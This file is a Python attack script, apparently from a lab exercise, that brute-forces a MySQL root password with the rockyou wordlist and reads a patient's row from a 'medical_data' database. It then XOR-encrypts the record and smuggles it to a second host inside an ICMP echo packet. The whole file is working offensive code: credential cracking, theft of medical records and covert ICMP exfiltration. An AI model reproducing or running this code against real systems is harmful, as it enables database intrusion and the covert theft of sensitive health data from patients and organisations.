import mysql.connector as mysql
import os, sys, socket, struct, select, time
import datetime
import re
from itertools import cycle
import random
import string

os.chdir(sys._MEIPASS)

# Crack password

# function that checks if pw is correct
def connect(pw, host):
    try:
        db = mysql.connect(
            host = host,
            user = "root",
            passwd = pw
        )
        return("success")
    except:
        return("wrong")

# Cracks the password, given a wordlist and a sql host (as root)
def getPassword(wordlist, host):
    for word in wordlist:
        print(word)
        if connect(word, host)=='success':
            pw = word
    return pw

# helper function to make result a string
def query_to_string(x):
    if isinstance(x, int): return str(x)
    elif isinstance(x, datetime.date): return x.strftime("%Y-%m-%d")
    return x

# Get data
def get_data(pw, dest):
    db = mysql.connect(
        host = host,
        user = "root",
        passwd = pw
    )

    cursor = db.cursor()

    cursor.execute("use medical_data;")

    cursor.execute("select * from patients where name = 'Our Guy';")
    result = cursor.fetchall()
    data = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([query_to_string(x) for x in tup]) for tup in result])

    # result in string format without nonalphanumeric chars.
    data = re.sub(r'[^a-zA-Z\d\s\.]', "", data)
    return data

# helper function for xor two strings
def XOR(plaintext, key):
    return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(plaintext, cycle(key)))

# helper function to generate password string
def passwordGen(stringLength):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(stringLength))

# takes list of tuples, outputs encrypted string.
def encrypt_data(data):

    # simple xor encryption, key is created and recorded in meterpreter shell.
    key_len = len(data.encode('utf-8'))
    key = passwordGen(key_len)
    enc_data = XOR(data, key)
    return enc_data, key

# Exfiltrate data in a packet header
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + (data[i + 1])
    if n:
        s += (data[i + 1] << 8)
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s

# Sends the data in one packet.
def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
    if packetsize:
        ICMP_LEN_BYTES = packetsize
    else:
        ICMP_LEN_BYTES = 64

    socket.setdefaulttimeout(timeout)
    try:
        icmp = socket.getprotobyname('icmp')
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
    except socket.error as e:
        raise e

    ICMP_ECHO_REQUEST = 8
    ICMP_CODE = 0
    ICMP_ID = os.getpid() & 0xFFFF
    ICMP_CHECKSUM = 0
    ICMP_SEQ = seq

    dest_addr = socket.gethostbyname(dest_addr)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST,
        ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQ)
    bytesInDouble = struct.calcsize("d")
    data = data_to_send
    data = struct.pack("d", time.time()) + data.encode(errors = 'ignore')

    ICMP_CHECKSUM = checksum(header + data)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, ICMP_CODE,
        socket.htons(ICMP_CHECKSUM), ICMP_ID, ICMP_SEQ)

    packet = header + data

    s.sendto(packet, (dest_addr, 0))
    print("sent ping. Waiting for reply.")
    while True:
        try:
            recPacket, addr = s.recvfrom(1024)
            timeReceived = time.time()
            icmpHeader = recPacket[20:28]
            _type, _code, _checksum, _packetID, _sequence = struct.unpack(
                'bbHHh', icmpHeader)
            if _packetID == ICMP_ID:
                _ttl = struct.unpack("B", recPacket[8:9])[0]
                timeSent = struct.unpack(
                    "d", recPacket[28:28 + bytesInDouble])[0]
                delay = (timeReceived - timeSent) * 1000
                print (
                    "SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
                    % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay, recPacket[36:]))
                time.sleep(1)
                return delay
        except socket.timeout:
            print("Request timeout for icmp_seq", ICMP_SEQ)
            return False
        except Exception as e:
            raise e

def main():
    host = "192.168.20.12"
    destination = "192.168.20.9"
    print("here we are:", os.getcwd())
    wordlist=open("rockyou-75.txt","r+").read().splitlines()

    password = getPassword(wordlist, host)
    print("got password:", password)
    sql_result = get_data(password, host)
    print("got sql data:", sql_result)
    data, key = encrypt_data(sql_result)
    print("encrypted data:", data)
    print("with key:", key)
    result = sendOnePing(1, destination, 102, data)

if __name__ == "__main__":
    main()
